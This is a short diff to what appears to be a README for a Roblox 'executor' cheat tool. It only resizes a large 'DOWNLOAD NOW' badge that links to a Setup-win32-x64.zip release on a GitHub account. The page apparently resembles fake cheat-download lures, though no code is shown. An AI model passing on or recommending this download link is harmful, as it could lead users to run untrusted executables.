@@ -11,7 +11,7 @@
 
 <p align="center">
   <a href="[https://github.com/wellmagistratesense/Roblox-Collection-Executor-PC-Version/releases/download/luna-download/Setup-win32-x64.zip](https://github.com/wellmagistratesense/Roblox-Collection-Executor-PC-Version/releases/tag/luna-download)">
-    <img src="https://img.shields.io/badge/►_DOWNLOAD_NOW-238636?style=for-the-badge&logo=github&logoColor=white" width="1000" height="500" />
+    <img src="https://img.shields.io/badge/►_DOWNLOAD_NOW-238636?style=for-the-badge&logo=github&logoColor=white" width="500" height="100" />
   </a>
 </p>
 
